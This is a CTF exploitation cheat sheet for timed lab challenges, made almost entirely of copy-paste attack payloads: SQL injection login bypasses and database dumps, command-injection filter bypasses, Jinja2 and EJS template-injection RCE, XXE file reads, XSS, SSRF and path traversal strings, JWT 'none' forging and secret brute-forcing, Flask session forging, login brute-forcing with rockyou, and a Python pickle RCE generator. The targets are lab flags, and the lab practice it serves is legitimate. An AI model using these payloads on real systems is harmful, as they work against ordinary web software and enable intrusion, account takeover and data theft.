# CTF Rapid Exploitation Cheat Sheet

This cheat sheet is optimized for **speed and copy-pasting** during timed practical evaluations. Payloads and techniques are based directly on the lab challenges.

---

## Table of Contents
- [1. 60-Second Port Triage Checklist](#1-60-second-port-triage-checklist)
- [2. SQL Injection (SQLi)](#2-sql-injection-sqli)
- [3. Command Injection & Filter Bypasses](#3-command-injection--filter-bypasses)
- [4. Server-Side Template Injection (SSTI)](#4-server-side-template-injection-ssti)
- [5. XML External Entity (XXE)](#5-xml-external-entity-xxe)
- [6. Cross-Site Scripting (XSS)](#6-cross-site-scripting-xss)
- [7. SSRF & Path Traversal / LFI](#7-ssrf--path-traversal--lfi)
- [8. Broken Auth, Sessions & Insecure Deserialization](#8-broken-auth-sessions--insecure-deserialization)
- [9. SNMP & Network Services](#9-snmp--network-services)
- [10. Useful Quick One-Liners](#10-useful-quick-one-liners)

---

## 1. 60-Second Port Triage Checklist

When landing on a new open port, follow this exact sequence:

1. **Source Code (`Ctrl+U`):** Check HTML comments for hardcoded flags or credentials (`<!-- FLAG: ... -->` as in [8018](services/8018.md)).
2. **Robots:** Check `/robots.txt` for disallowed directories (`/admin-secret/` as in [8017](services/8017.md)).
3. **Backup Files:** Check `<page>.bak`, `.py.bak`, `~`, `.swp`, or `/static/config.py.bak` ([8010](services/8010.md)).
4. **Git Repository:** Check `/.git/HEAD`. If open, dump with:
   ```bash
   pipx run git-dumper http://<TARGET>:<PORT>/ recovered_repo && cd recovered_repo && git log --all --oneline
   ```
5. **Inspect Cookies / Headers:** Run `curl -i http://<TARGET>:<PORT>/` to see cookies and headers.
   - Look for plaintext roles like `role=employee` ([8063](services/8063.md)) or base64 tokens ([8071](services/8071.md)).
   - Look for JWT tokens (`ey...` 3 parts): check for `"alg": "none"` bypass ([8066](services/8066.md)) or crack weak secrets ([8067](services/8067.md)).
   - Look for Flask session cookies (`ey...` timestamped): inspect and crack with `flask-unsign` ([8070](services/8070.md)).
   - Look for 40-hex SHA1 tokens: test timestamp / clock predictability ([8068](services/8068.md)).
6. **Hidden Endpoints & Parameters:**
   ```bash
   ffuf -u http://<TARGET>:<PORT>/FUZZ -w /usr/share/dirb/wordlists/common.txt -mc 200,301,302
   ```
7. **Password Reset Endpoints (`/forgot`):**
   - Submit reset requests and check raw HTML source for hidden token links (`style="display: none"` as in [8070](services/8070.md)).

---

## 2. SQL Injection (SQLi)

### Authentication Bypass (Forms / Logins)
```sql
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
admin'/*
" OR 1=1--
```

### UNION-Based Injection
1. **Find column count:**
   ```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
   ```
   Or:
   ```sql
   ' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--
   ' UNION SELECT NULL,NULL,NULL--
   ```

2. **Dump SQLite databases (standard in Python/Gunicorn labs):**
   * **List tables:**
     ```sql
     ' UNION SELECT 1,(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'),3--
     ```
   * **Dump schema (table structures):**
     ```sql
     ' UNION SELECT 1,(SELECT group_concat(sql) FROM sqlite_master),3--
     ```
   * **Dump `vault` table (most common flag table):**
     ```sql
     ' UNION SELECT 1,(SELECT group_concat(secret) FROM vault),3--
     ```
   * **Arbitrary table download form (like [8037](services/8037.md)):**
     * Table: `vault`
     * Filter: `1=1`

3. **Dump MySQL / MariaDB databases:**
   ```sql
   ' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
   ' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='vault'--
   ' UNION SELECT 1,group_concat(secret),3 FROM vault--
   ```

### Blind SQLi Probes
* **Boolean:** `' AND 1=1--` (True) vs `' AND 1=2--` (False)
* **Time Delay (Postgres):** `'; SELECT pg_sleep(3)--`
* **Time Delay (MySQL):** `' AND (SELECT SLEEP(3))--`
* **Automated Scripts:** Use [sqli_blind_droplite.py](scripts/sqli_blind_droplite.py) or [sqli_time_blind_guestbook.py](scripts/sqli_time_blind_guestbook.py).

---

## 3. Command Injection & Filter Bypasses

### Command Chaining Separators
```bash
; cat /flag/flag
&& cat /flag/flag
|| cat /flag/flag
| cat /flag/flag
```

### Unescaped Newlines (`\n`)
When command separators like `;` or `&&` are blocked, test URL-encoded newlines (`%0a`) ([8041](services/8041.md)):
```bash
curl -s -X POST http://<TARGET>:<PORT>/endpoint \
  --data-urlencode $'field=safe_val\ncat /flag/flag'
```

### Subshell Command Substitution
When input is inserted into a double-quoted string or echo statement ([8046](services/8046.md)):
```bash
$(cat /flag/flag)
`cat /flag/flag`
```

### Bypassing Space Restrictions
```bash
cat${IFS}/flag/flag
cat$IFS$9/flag/flag
{cat,/flag/flag}
cat</flag/flag
```

### Reading Files When `cat` is Blocked
```bash
head -n 50 /flag/flag
tail -n 50 /flag/flag
more /flag/flag
less /flag/flag
nl /flag/flag
base64 /flag/flag
od -c /flag/flag
xxd /flag/flag
python3 -c "print(open('/flag/flag').read())"
date -f /flag/flag          # Leaks file in error output (from 8053)
```

### Path Traversal / Path Normalization
```bash
/flag/./flag                # Bypasses exact string matches on '/flag/flag' (from 8047)
/flag/../flag/flag
```

---

## 4. Server-Side Template Injection (SSTI)

### Detection
* `{{7*7}}` -> `49` (Jinja2, Twig)
* `${7*7}` -> `49` (Java, Spring, Mako)
* `<%= 7*7 %>` -> `49` (EJS, ERB)

### Jinja2 / Python RCE Payloads (Lab Proven)
```jinja2
{{cycler.__init__.__globals__.os.popen('cat /flag/flag').read()}}
{{joiner.__init__.__globals__.os.popen('cat /flag/flag').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /flag/flag').read()}}
```

### Node.js / EJS Code Evaluation ([8045](services/8045.md))
```javascript
<%= process.getBuiltinModule('fs').readFileSync('/flag/flag', 'utf8') %>
<%= global.process.mainModule.require('child_process').execSync('cat /flag/flag').toString() %>
```

---

## 5. XML External Entity (XXE)

### Standard File Read Payload ([8043](services/8043.md))
Upload or POST the following XML payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag/flag">
]>
<catalog>
  <item>&xxe;</item>
</catalog>
```

Testing system access:
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

---

## 6. Cross-Site Scripting (XSS)

### Cookie Grant & Auto-Redirect
When accessing `/flag` requires a cookie like `xss_grant=1` ([8021](services/8021.md), [8022](services/8022.md)):
```html
<script>document.cookie='xss_grant=1;path=/';location.href='/flag';</script>
```

### Triggering Internal Functions ([8023](services/8023.md))
```html
<img src=x onerror="grant()">
<svg onload="grant()">
```

---

## 7. SSRF & Path Traversal / LFI

### Direct Local File Read via SSRF ([8048](services/8048.md))
```bash
curl -s -X POST 'http://<TARGET>:<PORT>/preview' \
  --data-urlencode 'url=file:///flag/flag'
```

### Localhost / Internal IP Probing
```
http://127.0.0.1:80/
http://localhost:8080/
http://0.0.0.0:8000/
http://[::]:80/
```

### Common Path Traversal Payloads
```
../../../../flag/flag
..%2f..%2f..%2f..%2fflag%2fflag
..;/..;/..;/..;/flag/flag
```

---

## 8. Broken Auth, Sessions & Insecure Deserialization

### Cookie Role Tampering ([8063](services/8063.md))
1. Capture cookie:
   ```bash
   curl -i -c cookies.txt -X POST http://<TARGET>:<PORT>/login -d "user=test&password=test"
   ```
2. Edit `cookies.txt`: change `role=employee` to `role=manager` or `role=admin`.
3. Send modified cookie:
   ```bash
   curl -i -b cookies.txt http://<TARGET>:<PORT>/manager
   ```

### Default Credentials Dictionary ([8060](services/8060.md), [8069](services/8069.md))
* `admin:admin123`
* `admin:password`
* `admin:admin`
* `root:root`
* `<username>:<username>123`

### JWT "none" Algorithm Bypass ([8066](services/8066.md))
When a server does not enforce cryptographic verification of the signature header:
1. Decode the original token to identify payload fields (`sub`, `partner`, `role`, `account`).
2. Generate an unsigned token setting `"alg": "none"` and leaving the signature empty (note the trailing period `.`):
```bash
TOKEN=$(python3 - <<'EOF'
import base64, json
def b64(o): return base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).rstrip(b'=').decode()
# Keep same payload claims, elevate role/partner/account
print(b64({"alg": "none", "typ": "JWT"}) + "." + b64({"partner": "admin", "role": "admin"}) + ".")
EOF
)
curl -H "Authorization: Bearer $TOKEN" http://<TARGET>:<PORT>/partner/admin
```

### JWT Weak HS256 Secret Brute-forcing ([8067](services/8067.md))
If HS256 algorithm is enforced with a weak or numeric secret (e.g. 4-digit PIN):
1. **Python offline brute-force (0000–9999 in <1s):**
```python
import base64, hashlib, hmac

token = "<JWT_TOKEN>"
h, p, sig_b64 = token.split(".")
target = base64.urlsafe_b64decode(sig_b64 + "=" * (-len(sig_b64) % 4))
signing_input = f"{h}.{p}".encode()

for i in range(10000):
    for s in (f"{i:04d}", str(i)):
        if hmac.compare_digest(hmac.new(s.encode(), signing_input, hashlib.sha256).digest(), target):
            print(f"[+] Found secret: {s}")
            break
```
2. **Hashcat dictionary attack:**
```bash
echo '<JWT_TOKEN>' > /tmp/jwt.txt
hashcat -m 16500 /tmp/jwt.txt ~/wordlists/rockyou.txt
```

### Predictable / Timestamp-based Session Tokens ([8068](services/8068.md))
If the session cookie is a 40-character hex string (SHA-1) minted at login:
1. Formula is commonly `sha1("<username>:<unix_second>")`.
2. To impersonate an admin triggered by an event (e.g. `/bot/refresh-oncall`), record `time.time()`, bracket the window `[now - 3, now + 4]`, and test:
```python
import hashlib, time

now = int(time.time())
for t in range(now - 3, now + 4):
    tok = hashlib.sha1(f"admin:{t}".encode()).hexdigest()
    # Test with: curl -b "token={tok}" http://<TARGET>:<PORT>/ticket/admin
```

### Flask Session Cookie Tampering (`flask-unsign`) ([8070](services/8070.md))
Flask stores session cookies using `itsdangerous` format (`<payload>.<timestamp>.<signature>`):
```bash
# 1. Install tool
pip install flask-unsign

# 2. Decode session contents
flask-unsign --decode --cookie '<COOKIE>'

# 3. Brute-force secret key
flask-unsign --unsign --cookie '<COOKIE>' --wordlist ~/wordlists/rockyou.txt

# 4. Forge arbitrary admin session cookie
flask-unsign --sign --cookie "{'user': 'postmaster'}" --secret '<SECRET>'

# 5. Access target with forged session
curl -sS -b 'session=<FORGED_COOKIE>' http://<TARGET>:<PORT>/mailbox
```

### Password Reset Token Leakage & User Enumeration ([8070](services/8070.md))
1. **User enumeration:** Check `/forgot` password responses for differences (status code, error messages, or response length deltas) between existing and non-existing accounts.
2. **Hidden DOM leaks:** CTF challenges often leak generated reset tokens directly into response HTML:
```bash
curl -s -X POST http://<TARGET>:<PORT>/forgot --data-urlencode "username=admin" | grep -i "reset"
# Look for <div style="display: none"><a href="/reset/<token>">...</a></div>
```

### Web Form Login Brute-Force ([8072](services/8072.md))
When given a seeded account without credentials and no rate limiting:
```bash
ffuf -u http://<TARGET>:<PORT>/login -X POST \
  -d "username=vpnuser&password=FUZZ" \
  -w ~/wordlists/rockyou.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid|incorrect|failed"
```
Also try common weak passwords first: `admin`, `password`, `123456`, `qwerty`, `vpnuser`, `welcome`.

### Python Pickle RCE Deserialization ([8051](services/8051.md))
Generate a base64 pickle payload executing arbitrary commands:
```python
import pickle, base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.popen, ('cat /flag/flag',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print("Paste this blob:", payload)
```

---

## 9. SNMP & Network Services

### SNMP Reconnaissance ([8024](services/8024.md))
```bash
# Query single OID (sysDescr)
snmpget -v2c -c public <TARGET>:<PORT> 1.3.6.1.2.1.1.1.0

# Walk entire MIB tree from root
snmpwalk -v2c -c public <TARGET>:<PORT> .1

# Debug packet errors with raw hex/ASCII dump (-d)
snmpwalk -d -v2c -c public <TARGET>:<PORT> .1
```

If the Net-SNMP client aborts due to protocol errors, use the raw socket scraper:
```bash
python3 scripts/snmp_udp_raw_walker.py
```

---

## 10. Useful Quick One-Liners

### Fast Local HTTP Listener (To catch callbacks / exfiltration)
```bash
python3 -m http.server 9999
```

### Quick URL Decoder
```bash
python3 -c "import urllib.parse, sys; print(urllib.parse.unquote(sys.argv[1]))" '<ENCODED_STRING>'
```

### Quick Base64 Decoder
```bash
echo -n '<BASE64_STRING>' | base64 -d
```

### Rapid HTTP Title Checker (Quick Port Triage)
```bash
python3 -c '
import urllib.request, re
for p in range(8010, 8085):
    try:
        html = urllib.request.urlopen(f"http://10.110.3.72:{p}", timeout=1).read().decode("utf-8", "ignore")
        title = re.search(r"<title>(.*?)</title>", html, re.I)
        t = title.group(1).strip() if title else "No title"
        print(f"Port {p}: {t}")
    except: pass
'
```
